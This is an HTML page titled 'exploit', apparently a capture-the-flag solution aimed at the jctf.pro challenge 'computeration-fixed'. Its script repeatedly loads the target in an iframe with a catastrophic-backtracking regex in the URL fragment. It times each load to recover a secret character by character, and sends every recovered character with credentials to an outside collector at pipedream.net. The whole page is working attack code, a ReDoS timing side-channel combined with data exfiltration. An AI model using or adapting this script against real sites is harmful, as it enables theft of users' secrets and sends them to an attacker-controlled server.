<!DOCTYPE html>
<html>
<head>
        <title>exploit</title>
</head>
<body></body>
<script>
var chars='abcdefghijklmnopqrstuvwxyz_';
var charLen = chars.length;
var ENDPOINT = "https://computeration-fixed.web.jctf.pro/"
var x = document.createElement('iframe');

window.open("https://computeration-fixed.web.jctf.pro/");
function search(leak, charCounter) {

        var curChar = chars[charCounter];
        x.setAttribute("src", 'https://computeration-fixed.web.jctf.pro/#^' + leak + curChar+'(((.*)*)*)!');
        h =  performance.now();
        document.body.appendChild(x);
        x.onload = () => {
        if(diff = performance.now() - h>400){
                leak += curChar
                var xhr = new XMLHttpRequest();
                        xhr.open('GET', 'https://encnu1395lyv7.x.pipedream.net/?cmd='+leak, true); 
                        xhr.withCredentials = true; 
                        xhr.send(null); 
                console.log("leak = " + leak);
                }
        search(leak , (charCounter +1 ) % chars.length);
        }
}

function exploit(){
        search("j",0);
}

exploit();
</script>
</html>
